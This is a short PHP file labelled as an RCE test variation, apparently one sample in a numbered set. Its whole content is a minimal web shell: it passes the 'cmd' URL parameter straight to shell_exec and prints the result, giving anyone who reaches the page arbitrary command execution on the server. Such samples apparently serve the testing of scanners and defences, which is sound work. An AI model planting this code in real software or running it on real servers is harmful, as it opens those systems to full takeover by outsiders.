<?php
// RCE test variation #1157
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>